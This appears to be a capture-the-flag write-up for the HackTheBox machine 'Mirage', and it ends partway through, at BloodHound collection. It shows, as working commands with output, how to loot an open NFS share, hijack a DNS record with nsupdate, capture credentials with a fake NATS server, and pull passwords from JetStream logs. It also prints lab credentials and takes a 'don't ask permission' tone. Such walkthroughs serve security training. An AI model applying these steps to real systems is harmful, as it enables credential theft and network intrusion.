# 🎯 Target: `Mirage` (HTB)

> **Difficulty**: HARD  
> **OS**: Windows  
> **Season 8**
> **Category**: Active Directory, AD CS, Kerberos, RBCD, Certificate Abuse 
> **Creators:** [EmSec](https://app.hackthebox.com/users/962022) & [ctrlzero](https://app.hackthebox.com/users/168546)
> **By**: [jusot99](https://jusot99.github.io)  
> 
> _"Real hackers don’t ask for permission. We get in, stay low, and make it look like magic."_ 


## 🧠 Mindset

This machine was not about simple wins. It was about failing forward, chaining the tiniest crack into an empire-sized breach. Certificates, delegation, and impersonation every move demanded precision and persistence.

---

## 🧰 Tools Used

- `nmap`
    
- `showmount`
    
- `impacket` tools (`getTGT`, `GetUserSPNs`, `secretsdump`, etc.)
    
- `certipy-ad`
    
- `netexec` 
    
- `bloodhound-python`
    
- `evil-winrm`
    
- `natscli`
    
- `bloodyAD`
    


---

## 🔎 Recon

### 🔍 Nmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 16:50 EDT
Nmap scan report for 10.10.11.78
Host is up (0.39s latency).

PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-20 03:50:58Z)
111/tcp   open  rpcbind         2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp  open  nlockmgr        1-4 (RPC #100021)
3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","server_name":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":30166,"client_ip":"10.10.16.64","xkey":"XB6S53JYEN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","server_name":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":30167,"client_ip":"10.10.16.64","xkey":"XB6S53JYEN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","server_name":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":30168,"client_ip":"10.10.16.64","xkey":"XB6S53JYEN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","server_name":"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":30165,"client_ip":"10.10.16.64","xkey":"XB6S53JYEN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf          .NET Message Framing
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc           Microsoft Windows RPC
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
51231/tcp open  msrpc           Microsoft Windows RPC
63825/tcp open  msrpc           Microsoft Windows RPC
63833/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
63836/tcp open  msrpc           Microsoft Windows RPC
63849/tcp open  msrpc           Microsoft Windows RPC
63853/tcp open  msrpc           Microsoft Windows RPC
63864/tcp open  msrpc           Microsoft Windows RPC
63876/tcp open  msrpc           Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=7/19%Time=687C0612%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D2,"INFO\x20{\"server_id\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWW
SF:KP6QVTQ2NX46VQMSNC\",\"server_name\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJ
SF:WBEOWWKP6QVTQ2NX46VQMSNC\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_c
SF:ommit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"por
SF:t\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":104857
SF:6,\"jetstream\":true,\"client_id\":30165,\"client_ip\":\"10\.10\.16\.64
SF:\",\"xkey\":\"XB6S53JYEN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS\
SF:"}\x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLines,1D3,
SF:"INFO\x20{\"server_id\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ
SF:2NX46VQMSNC\",\"server_name\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWK
SF:P6QVTQ2NX46VQMSNC\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\"
SF::\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":422
SF:2,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jet
SF:stream\":true,\"client_id\":30166,\"client_ip\":\"10\.10\.16\.64\",\"xk
SF:ey\":\"XB6S53JYEN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS\"}\x20\
SF:r\n-ERR\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D3,"INFO\x2
SF:0{\"server_id\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQM
SF:SNC\",\"server_name\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2N
SF:X46VQMSNC\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cf
SF:da\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"head
SF:ers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\"
SF::true,\"client_id\":30167,\"client_ip\":\"10\.10\.16\.64\",\"xkey\":\"X
SF:B6S53JYEN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS\"}\x20\r\n-ERR\
SF:x20'Authorization\x20Violation'\r\n")%r(HTTPOptions,1D3,"INFO\x20{\"ser
SF:ver_id\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMSNC\",\
SF:"server_name\":\"NAYCSSWCSF26GLAGPTIWFVOU3ALNJWHJWBEOWWKP6QVTQ2NX46VQMS
SF:NC\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"
SF:go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":t
SF:rue,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\
SF:"client_id\":30168,\"client_ip\":\"10\.10\.16\.64\",\"xkey\":\"XB6S53JY
SF:EN4GLE4RR5AIP2HRHU753HLFAAOVOZEGWWWNLTJCKAOXB2IS\"}\x20\r\n-ERR\x20'Aut
SF:horization\x20Violation'\r\n");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-07-20T04:07:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1324.28 seconds
```

- SMB, LDAP, Kerberos, WinRM, ADWS, DNS, LDAPS open.
    
- Domain found: `mirage.htb` & `dc01.mirage.htb`
    
- Map a HTB machine locally so we can resolve it by name
     
	`echo '10.10.xx.xx mirage.htb dc01.mirage.htb nats-svc.mirage.htb' | sudo tee -a /etc/hosts`

---
## 🧭 Enumeration

- NFS Share

> _"When shares are open to the world, secrets slip through the cracks."_ — Jusot

We found an open NFS export on the target that allowed anyone to mount and access internal reports.

---

### 🔍 BANG — NFS Export Found!

```bash
❯ showmount -e 10.10.11.78

Export list for 10.10.11.78:
/MirageReports (everyone)
```

🔥 **WHAT?!** A world-readable NFS export in production? Someone's sleeping at the wheel.
A globally accessible NFS share? That’s a red flag waving in the wind. Time to grab what’s left behind.

---

### 📂 Mounting and Looting the Share

```bash
❯ mkdir /tmp/nfs_mirage
❯ mount -t nfs 10.10.11.78:/MirageReports /tmp/nfs_mirage
❯ ls /tmp/nfs_mirage

Incident_Report_Missing_DNS_Record_nats-svc.pdf
Mirage_Authentication_Hardening_Report.pdf
❯ cp /tmp/nfs_mirage/* .
```

🔥 **BOOM** Two juicy files dropped into `/MirageReports`, both likely left behind by mistake. Their names already leak context:

- **Incident_Report_Missing_DNS_Record_nats-svc.pdf** 👀 Explains why our DNS spoof worked.
    
- **Mirage_Authentication_Hardening_Report.pdf** 🔐 Might contain insight into auth mechanisms or vulnerabilities.
    

---

> _"One man's trash is another man's initial foothold. Always check the public shares."_
> 
## 🔍 What We Learned

### 📄 **Document 1: Deprecating NTLM Report**

- **NTLM is being phased out**
    
- **Kerberos-only model in progress**, with test systems enforcing it as of **August 2025**
    
- NTLM may still be accepted **on critical or legacy systems**
    
- **Security tightening = possible misconfigs**, certs, and Kerberos are the next attack vectors
    

🧠 **Mindset**: They’re trying to secure the domain, but partial rollouts often leave gaps like misconfigured delegation or overly-permissive cert templates.

---

### 📄 **Document 2: Missing DNS Record for `nats-svc.mirage.htb`**

- Internal service: **NATS messaging system**
    
- DNS record for `nats-svc.mirage.htb` was removed due to scavenging
    
- Service was **offline >14 days**
    
- ⚠️ **Apps may still try to resolve `nats-svc.mirage.htb`**, risking spoof/hijack
    

🧠 **Mindset**: A record that gets scavenged is a stealth opportunity. We can potentially **spoof it, intercept it, or abuse trust** in that name.

### 🎯 The Target: `nats-svc.mirage.htb`

An internal NATS messaging service used by the domain. The DNS record had been scavenged (deleted due to inactivity), making it a prime target for DNS spoofing attacks.

---

### 🔥 Terminal 1 — Fake NATS Server Setup

```bash
python3 -c 'import socket,colorama;from colorama import Fore,Style;colorama.init(autoreset=True);s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4222));s.listen(5);print(f"{Style.BRIGHT}[{Fore.GREEN}*{Fore.RESET}]{Style.RESET_ALL} Fake NATS listening on 0.0.0.0:4222");exec("while 1:\n c,a=s.accept()\n print(f\"{Style.BRIGHT}[{Fore.CYAN}*{Fore.RESET}]{Style.RESET_ALL} Connection from {a[0]}\");\n try:\n  c.sendall(b\"INFO {\\\"server_id\\\":\\\"FAKE-NATS\\\",\\\"version\\\":\\\"3.0.0\\\",\\\"auth_required\\\":true}\\r\\n\")\n  data=b\"\"\n  while 1:\n   chunk=c.recv(4096)\n   if not chunk: break\n   data+=chunk\n  if data:\n   print(f\"{Style.BRIGHT}[{Fore.YELLOW}-> {Fore.RESET}]{Style.RESET_ALL} Received:\")\n   print(data.decode(errors=\"ignore\"))\n  else:\n   print(f\"{Style.BRIGHT}[{Fore.MAGENTA}!{Fore.RESET}]{Style.RESET_ALL} No data received (client silent or closed)\")\n except Exception as e:\n  print(f\"{Style.BRIGHT}[{Fore.RED}!{Fore.RESET}]{Style.RESET_ALL} Error: {e}\")\n finally:\n  c.close()")'
```

📥 **Output**

```csharp
[*] Fake NATS listening on 0.0.0.0:4222
[*] Connection from 10.10.11.78
[-> ] Received:
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":false,"no_responders":false}
PING
```

> _"Here we sit, like the silent puppetmaster. The client spills its creds like secrets whispered in the dark."_

---

### 🔥 Terminal 2 — DNS Spoofing with `nsupdate`

```bash
❯ nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 3600 A 10.10.x.x
> send
```

📌 Replace `10.10.x.x` with the IP shown by:

```bash
ip a show tun0
```

> _"With the DNS record in our hands, we own the name all client connections now bow to our fake server."_

---

### 🎯 Result: Credentials Stolen!

The `CONNECT` message captured the **username** and **password**:

```json
{"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!"}
```
🔥 **WHAT?!** Cleartext creds from a service?  
🔥 **BANG!** NATS CLI didn’t see it coming and now, it’s ours.

---

This early foothold allowed us to escalate trust in the domain by abusing service account credentials a classic case of exploiting forgotten DNS records and service trust relationships.

---
### 🛠️ Fetching `natscli` Like a Ghost — No `apt`, No Permission, No Problem

> _🔥 Damn it — no package found? No repo? So what — we ain’t civilians._  
> _We ghost through the internet, yank the binary out from GitHub like a thief in the stream._

---

You want it **weird**? You got it. Here's the twisted remix if you're feeling rogue:

```bash
(echo "🌀 Summoning the binary..."; curl -sSL https://github.com/nats-io/natscli/releases/download/v0.2.4/nats-0.2.4-amd64.deb -o nats.deb && dpkg -i nats.deb && rm nats.deb && echo "⚔️  Installed. Let’s go slice open the pipe.")
```

> _"Installers wait. Hackers summon."_  
> _🔥 WHAT?! We installing tools like we summon demons._

#### 🧠 First-Time NATS Operator — Taking Over the Message Bus

So we intercepted creds for a **message broker** called NATS. Never heard of it before? Doesn’t matter.

> _“Hackers don’t need manuals — we bend protocols ‘til they spill the truth.”_

---

### 🛠️ Step 1 — Bring in the NATS client tool

Your OS doesn’t ship with the `nats` CLI, and it’s not in your package manager. That’s fine we don’t ask permission:

```bash
curl -sSL https://github.com/nats-io/natscli/releases/download/v0.2.4/nats-0.2.4-amd64.deb -o nats.deb && dpkg -i nats.deb && rm nats.deb
```

> _"Grab the tool. Install it. Wipe the package. Stay invisible."_

---

### ⚙️ Step 2 — Set up a secure profile (aka ‘context’)

Think of it like saving a remote login with creds a shortcut to operate fast:

```bash
❯ nats context add internal-broker \
    --server nats://dc01.mirage.htb:4222 \
    --user Dev_Account_A \
    --password 'hx5h7F5554fP@1337!' \
    --description "Captured service access"
```

📥 **Output**

```bash
❯ nats context add internal-broker \
    --server nats://dc01.mirage.htb:4222 \
    --user Dev_Account_A \
    --password 'hx5h7F5554fP@1337!' \
    --description "Captured service access"
NATS Configuration Context "internal-broker"

  Description: Captured service access
  Server URLs: nats://dc01.mirage.htb:4222
     Username: Dev_Account_A
     Password: ******************
         Path: /root/.config/nats/context/internal-broker.json

```
Now anytime you type `--context internal-broker`, you’re talking directly to that server.

---

### 👀 Step 3 — Watch for messages in real-time

Let’s see if the broker is actively passing any traffic we can intercept:

```bash
❯ nats --context internal-broker sub ">"
```

The `>` means “subscribe to everything.” You might see logs, tokens, or weird signals.

📥 **Output**

```bash
❯ nats --context internal-broker sub ">" --count 10
09:21:32 Subscribing on > 
[#1] Received on "$JS.API.STREAM.INFO.auth_logs" with reply "_INBOX.zfMa5233rR1h28e4N4Zyf3.RDfG6UtB"
nil body


[#2] Received on "_INBOX.zfMa5233rR1h28e4N4Zyf3.RDfG6UtB"
{"type":"io.nats.jetstream.api.v1.stream_info_response","total":0,"offset":0,"limit":0,"config":{"name":"auth_logs","subjects":["logs.auth"],"retention":"limits","max_consumers":-1,"max_msgs":100,"max_bytes":1048576,"max_age":0,"max_msgs_per_subject":-1,"max_msg_size":-1,"discard":"new","storage":"file","num_replicas":1,"duplicate_window":120000000000,"compression":"none","allow_direct":true,"mirror_direct":false,"sealed":false,"deny_delete":true,"deny_purge":true,"allow_rollup_hdrs":false,"consumer_limits":{},"allow_msg_ttl":false,"metadata":{"_nats.level":"1","_nats.req.level":"0","_nats.ver":"2.11.3"}},"created":"2025-05-05T07:18:19.6244845Z","state":{"messages":5,"bytes":570,"first_seq":1,"first_ts":"2025-05-05T07:18:56.6788658Z","last_seq":5,"last_ts":"2025-05-05T07:19:27.2106658Z","num_subjects":1,"consumer_count":2},"cluster":{"leader":"NBD6ATSUUJVPUMPJTDZGBOU7MGDYKD7E426I5CQYFVUXCVCJCP3JQU5F"},"ts":"2025-07-23T20:22:02.0399598Z"}


[#3] Received on "$JS.EVENT.ADVISORY.API"
{"type":"io.nats.jetstream.advisory.v1.api_audit","id":"Lwr3VRd580MlkTLFXMFQqi","timestamp":"2025-07-23T20:22:02.0399598Z","server":"NBD6ATSUUJVPUMPJTDZGBOU7MGDYKD7E426I5CQYFVUXCVCJCP3JQU5F","client":{"start":"2025-07-23T13:22:02.0394284-07:00","host":"10.10.11.78","id":203,"acc":"dev","user":"Dev_Account_A","name":"NATS CLI Version 0.2.2","lang":"go","ver":"1.41.1","rtt":1,"server":"NBD6ATSUUJVPUMPJTDZGBOU7MGDYKD7E426I5CQYFVUXCVCJCP3JQU5F","kind":"Client","client_type":"nats"},"subject":"$JS.API.STREAM.INFO.auth_logs","response":"{\"type\":\"io.nats.jetstream.api.v1.stream_info_response\",\"total\":0,\"offset\":0,\"limit\":0,\"config\":{\"name\":\"auth_logs\",\"subjects\":[\"logs.auth\"],\"retention\":\"limits\",\"max_consumers\":-1,\"max_msgs\":100,\"max_bytes\":1048576,\"max_age\":0,\"max_msgs_per_subject\":-1,\"max_msg_size\":-1,\"discard\":\"new\",\"storage\":\"file\",\"num_replicas\":1,\"duplicate_window\":120000000000,\"compression\":\"none\",\"allow_direct\":true,\"mirror_direct\":false,\"sealed\":false,\"deny_delete\":true,\"deny_purge\":true,\"allow_rollup_hdrs\":false,\"consumer_limits\":{},\"allow_msg_ttl\":false,\"metadata\":{\"_nats.level\":\"1\",\"_nats.req.level\":\"0\",\"_nats.ver\":\"2.11.3\"}},\"created\":\"2025-05-05T07:18:19.6244845Z\",\"state\":{\"messages\":5,\"bytes\":570,\"first_seq\":1,\"first_ts\":\"2025-05-05T07:18:56.6788658Z\",\"last_seq\":5,\"last_ts\":\"2025-05-05T07:19:27.2106658Z\",\"num_subjects\":1,\"consumer_count\":2},\"cluster\":{\"leader\":\"NBD6ATSUUJVPUMPJTDZGBOU7MGDYKD7E426I5CQYFVUXCVCJCP3JQU5F\"},\"ts\":\"2025-07-23T20:22:02.0399598Z\"}"}
```

---

### 📦 Step 4 — Look for persistent data (JetStream)

Some systems store their messages long-term using **JetStream**, like a message vault.

Check if it’s active:

```bash
❯ nats --context internal-broker stream ls
```

If streams exist, try to get their blueprint:

```bash
❯ nats --context internal-broker stream info <stream-name>
```

Example:

```bash
❯ nats --context internal-broker stream ls
```

📥 **Output**

```bash
❯ nats --context internal-broker stream ls                                       

Streams
Name       Messages  Size     Last Message
auth_logs  5         570 B    79d13h3m21s
```


```bash
❯ nats --context internal-broker stream info auth_logs
```

📥 **Output**

```bash
❯ nats --context internal-broker stream info auth_logs
Information for Stream auth_logs created 2025-05-05 03:18:19

                Subjects: logs.auth
                Replicas: 1
                 Storage: File

Options:

               Retention: Limits
         Acknowledgments: true
          Discard Policy: New
        Duplicate Window: 2m0s
              Direct Get: true
    Allows Batch Publish: false
         Allows Counters: false
       Allows Msg Delete: false
  Allows Per-Message TTL: false
            Allows Purge: false
          Allows Rollups: false

Limits:

        Maximum Messages: 100
     Maximum Per Subject: unlimited
           Maximum Bytes: 1.0 MiB
             Maximum Age: unlimited
    Maximum Message Size: unlimited
       Maximum Consumers: unlimited

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
                Messages: 5
                   Bytes: 570 B
          First Sequence: 1 @ 2025-05-05 03:18:56
           Last Sequence: 5 @ 2025-05-05 03:19:27
        Active Consumers: 2
      Number of Subjects: 1

```

---

### 🎯 Step 5 — Create a consumer (silent log reader)

If you see anything sensitive, make a reader just for you one that only pulls and never talks back.

```bash
❯ nats --context internal-broker consumer add auth_logs watcher \
    --pull \
    --ack explicit \
    --deliver all \
    --replay instant \
    --filter logs.auth \
    --max-deliver 10 \
    --max-pending 20 \
    --no-headers-only
```

📥 **Output**

```bash
❯ nats --context internal-broker consumer add auth_logs watcher \
    --pull \
    --ack explicit \
    --deliver all \
    --replay instant \
    --filter logs.auth \
    --max-deliver 10 \
    --max-pending 20 \
    --no-headers-only
[internal-broker] ? Add a Retry Backoff Policy No
Information for Consumer auth_logs > watcher created 2025-07-23 19:39:03

Configuration:

                    Name: watcher
               Pull Mode: true
          Filter Subject: logs.auth
          Deliver Policy: All
              Ack Policy: Explicit
                Ack Wait: 30.00s
           Replay Policy: Instant
      Maximum Deliveries: 10
         Max Ack Pending: 20
       Max Waiting Pulls: 512

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0
    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0
        Outstanding Acks: 0 out of maximum 20
    Redelivered Messages: 0
    Unprocessed Messages: 5
           Waiting Pulls: 0 of maximum 512
```

---

### 🔥 Step 6 — Pull hidden logs

```bash
❯ nats --context internal-broker consumer next auth_logs watcher --count=5 --ack
```

📥 **Output**

```bash
❯ nats --context internal-broker consumer next auth_logs watcher --count=5 --ack
[12:40:17] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[12:40:17] subj: logs.auth / tries: 1 / cons seq: 2 / str seq: 2 / pending: 3

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[12:40:17] subj: logs.auth / tries: 1 / cons seq: 3 / str seq: 3 / pending: 2

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[12:40:18] subj: logs.auth / tries: 1 / cons seq: 4 / str seq: 4 / pending: 1

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[12:40:18] subj: logs.auth / tries: 1 / cons seq: 5 / str seq: 5 / pending: 0

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message
```

🔥 Boom We’re now looking into internal traffic. Maybe something like this:

```json
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@"}
```

> _"One log entry. One exposed service account. That’s all it takes to pivot."_

---

### 💡 Hacker Insight

- NATS is lightweight, but most devs forget it logs.
    
- JetStream is like a black box unless you know how to open it.
    
- Stealth consumers let you stay invisible while reading everything.
    

---

> _"You don’t need to know NATS. You just need to make it talk."_

## ⚙️ Clock Sync for Kerberos

> _"Kerberos don’t play with broken time."_  
> Without proper sync, TGT will be invalid.

```bash
❯ sudo timedatectl set-ntp false
❯ ntpdate -u 10.10.11.78
```

> _"Time skew = instant ticket denial. Always sync when playing with KRB."_ ⏱️

---

## 🧪 LDAP Authentication Check

### 🔓 LDAP check — creds are gold

```bash
netexec ldap 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
```

📥 **Output**

```
LDAP        10.10.11.78     389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

✅ **Valid Kerberos creds, authenticated over LDAP**```

> _"If LDAP lets you in, you're already in the bloodstream."_ 🩸

---
## 📜 Optional — Auto-Generate `krb5.conf`

```bash
netexec smb 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --generate-krb5-file /etc/krb5.conf
```

But look out 👇

```bash
default_realm = 10.10.11.78
kdc = 10.10.11.78.10.10.11.78
```

🔥 Damn it — that’s ugly. That’s not how we roll.

---

## 🔧 Real One: Clean, Manual Config

```bash
nano /etc/krb5.conf
```

Paste this:

```bash
[libdefaults]
    default_realm = MIRAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
    MIRAGE.HTB = {
        kdc = dc01.mirage.htb
        admin_server = dc01.mirage.htb
    }

[domain_realm]
    .mirage.htb = MIRAGE.HTB
    mirage.htb = MIRAGE.HTB
```

> _"This config isn’t pretty. It’s surgical. One realm, one shot, no misses."_ 🔥

## 🧛 Ghost-Walk the Domain: User Blood Sample

```bash
netexec ldap 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --users
```

📥 **Output**

```text
[*] Enumerated 10 domain users: mirage.htb

-Username-            -Last PW Set-         -BadPW-  -Description-
Administrator         2025-06-23 17:18:18   0        Built-in admin account
Guest                 <never>               0        Guest access (lame)
krbtgt                2025-05-01 03:42:23   0        Kerberos TGT engine
Dev_Account_A         2025-05-27 10:05:12   0        
Dev_Account_B         2025-05-02 04:28:11   1        
david.jjackson        2025-05-02 04:29:50   0        
javier.mmarshall      2025-07-23 19:52:20   0        External contractor  
mark.bbond            2025-06-23 17:18:18   0        
nathan.aadam          2025-06-23 17:18:18   0        
svc_mirage            2025-05-22 16:37:45   0        Legacy service user
```

🔎 **Takeaways:**

- `svc_mirage` smells like a service account 👃
    
- `Dev_Account_B` got a bad login attempt — might be bait 🎣
    
- `javier.mmarshall` flagged as _Contractor_ 👷‍♂️ = potential weak link
    
- `Administrator`, `krbtgt`, and `Guest` are classic decoys 🪤
    
- We already own `david.jjackson`, so pivot is next ⛓️
    

> _"This ain’t just a list. It’s a battlefield. Every username is either a shield or a weapon."_ 🔪

---
## 🩸 BloodHound Kerberos Collection

### Run with Kerberos auth:

```bash
bloodhound-python -u david.jjackson -p 'pN8kQmn6b86!1234@' -k -d mirage.htb -ns 10.10.11.78 -c All --zip
```

